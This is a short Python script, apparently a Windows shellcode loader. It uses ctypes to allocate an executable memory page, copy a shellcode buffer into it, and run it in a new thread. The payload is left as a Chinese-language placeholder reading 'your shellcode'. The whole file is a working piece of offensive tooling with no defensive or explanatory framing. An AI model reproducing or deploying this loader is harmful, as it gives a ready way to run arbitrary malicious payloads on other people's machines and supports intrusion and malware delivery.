import ctypes

shellcode = b"你的shellcode"
ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64
rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)
ctypes.cdll.msvcrt.memmove(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(shellcode), len(shellcode))
handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handle,-1)